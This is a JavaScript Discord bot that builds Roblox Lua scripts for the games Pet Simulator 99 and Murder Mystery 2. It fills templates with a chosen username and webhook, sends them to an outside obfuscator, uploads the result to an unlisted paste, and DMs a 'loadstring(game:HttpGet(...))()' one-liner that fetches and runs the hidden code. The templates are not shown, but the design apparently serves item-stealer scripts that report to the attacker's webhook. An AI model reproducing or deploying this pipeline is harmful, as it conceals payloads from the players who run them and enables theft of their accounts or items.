// ======================= bot.js =======================
require("dotenv").config();

const fs = require("fs");
const path = require("path");
const axios = require("axios");
const { spawn } = require("child_process");

const {
  Client,
  GatewayIntentBits,
  Partials,
  REST,
  Routes,
  SlashCommandBuilder,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  ActionRowBuilder,
  AttachmentBuilder,
} = require("discord.js");

// ---------- CONFIG ----------
const TOKEN = process.env.DISCORD_TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const GUILD_ID = process.env.GUILD_ID;

const BASE_FOLDER =
  process.env.BASE_FOLDER || path.join(__dirname, "generated");
const OBFUSCATOR_URL = process.env.OBFUSCATOR_URL || "https://goofyscator.lua.cz/obfuscate";
const PASTEFY_API_KEY = process.env.PASTEFY_API_KEY;

if (!TOKEN || !CLIENT_ID) {
  console.error("❌ Missing DISCORD_TOKEN or CLIENT_ID in .env");
  process.exit(1);
}

fs.mkdirSync(BASE_FOLDER, { recursive: true });

// ---------- TEMPLATE MAP ----------
const TEMPLATE_MAP = {
  scriptA: path.join(__dirname, "pet99.lua"),
  scriptB: path.join(__dirname, "mm2.lua"),
};

// ---------- HELPERS ----------
const sanitize = (s) =>
  String(s || "user").replace(/[^a-zA-Z0-9_-]/g, "_");

function buildScript(template, u, webhook) {
  const safe = (v) =>
    String(v || "")
      .replace(/\\/g, "\\\\")
      .replace(/"/g, '\\"')
      .replace(/\r?\n/g, "\\n");

  return template
    .replace(/%%USERNAME%%/g, safe(u))
    .replace(/%%WEBHOOK%%/g, safe(webhook));
}

function ensureUserDir(user) {
  const dir = path.join(BASE_FOLDER, sanitize(user.username));
  fs.mkdirSync(dir, { recursive: true });
  return dir;
}

// ---------- PREPROCESSOR + GOOFYSCATOR ----------
async function runObfuscator(inputPath) {
  // Step 1: Run preprocess.js to strip comments
  const preprocessed = await new Promise((resolve, reject) => {
    const proc = spawn(process.execPath, [path.join(__dirname, "preprocess.js"), inputPath], {
      windowsHide: true,
    });
    let out = "";
    let err = "";
    proc.stdout.on("data", (d) => (out += d.toString()));
    proc.stderr.on("data", (d) => (err += d.toString()));
    proc.on("close", (code) => {
      if (code !== 0) return reject(new Error(err || "Preprocessor failed"));
      resolve(out);
    });
  });

  // Step 2: Send to Goofyscator
  const res = await axios.post(
    OBFUSCATOR_URL,
    { source: preprocessed },
    {
      headers: {
        "Content-Type": "application/json",
        "User-Agent": "GoofyscatorBot/1.0",
      },
      timeout: 30000,
    }
  );

  if (res.data && res.data.obfuscated) return res.data.obfuscated;
  if (res.data && res.data.code) return res.data.code;
  if (res.data && res.data.result) return res.data.result;
  if (typeof res.data === "string") return res.data;

  throw new Error("Unexpected response from obfuscator");
}

// ---------- PASTEFY ----------
async function uploadToPastefy(script) {
  const res = await axios.post(
    "https://pastefy.app/api/v2/paste",
    {
      content: script,
      title: "Paste-" + Math.random().toString(36).slice(2, 8),
      visibility: "UNLISTED",
    },
    {
      headers: {
        Authorization: `Bearer ${PASTEFY_API_KEY}`,
        "Content-Type": "application/json",
      },
    }
  );
  return res.data.paste.raw_url;
}

// ---------- SCRIPT GENERATION ----------
async function generateScript(u, webhook, user, templatePath) {
  const dir = ensureUserDir(user);
  const template = fs.readFileSync(templatePath, "utf8");
  const rawScript = buildScript(template, u, webhook);

  const rawPath = path.join(dir, "script.lua");
  fs.writeFileSync(rawPath, rawScript);

  const obfuscated = await runObfuscator(rawPath);
  return uploadToPastefy(obfuscated);
}

// ---------- DISCORD ----------
const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.DirectMessages],
  partials: [Partials.Channel],
});

const commands = [
  new SlashCommandBuilder()
    .setName("generate")
    .setDescription("Generate a Roblox script")
    .addStringOption((o) =>
      o
        .setName("script")
        .setDescription("Choose script type")
        .setRequired(true)
        .addChoices(
          { name: "Pet99 Script", value: "scriptA" },
          { name: "MM2 Script", value: "scriptB" }
        )
    )
    .toJSON(),
];

client.on("interactionCreate", async (i) => {
  if (i.isChatInputCommand() && i.commandName === "generate") {
    const modal = new ModalBuilder()
      .setCustomId(`gen:${i.options.getString("script")}`)
      .setTitle("Generate Script")
      .addComponents(
        new ActionRowBuilder().addComponents(
          new TextInputBuilder()
            .setCustomId("u")
            .setLabel("Username")
            .setRequired(true)
            .setStyle(TextInputStyle.Short)
        ),
        new ActionRowBuilder().addComponents(
          new TextInputBuilder()
            .setCustomId("wh")
            .setLabel("Webhook")
            .setRequired(true)
            .setStyle(TextInputStyle.Short)
        )
      );
    return i.showModal(modal);
  }

  if (i.isModalSubmit() && i.customId.startsWith("gen:")) {
    await i.deferReply({ ephemeral: true });

    try {
      const templateKey = i.customId.split(":")[1];
      const templatePath = TEMPLATE_MAP[templateKey];

      const rawUrl = await generateScript(
        i.fields.getTextInputValue("u"),
        i.fields.getTextInputValue("wh"),
        i.user,
        templatePath
      );

      await i.user.send({
        content: `\`\`\`lua\nloadstring(game:HttpGet("${rawUrl}"))()\n\`\`\``
      });

      await i.editReply("✅ Script generated. Check your DMs.");
    } catch (e) {
      const file = new AttachmentBuilder(Buffer.from(String(e)), {
        name: "error.txt",
      });
      await i.editReply({
        content: "❌ Failed to generate script.",
        files: [file],
      });
    }
  }
});

// ---------- START ----------
(async () => {
  const rest = new REST({ version: "10" }).setToken(TOKEN);
  await rest.put(
    GUILD_ID
      ? Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID)
      : Routes.applicationCommands(CLIENT_ID),
    { body: commands }
  );
  await client.login(TOKEN);
  console.log("✅ Bot started successfully");
})();
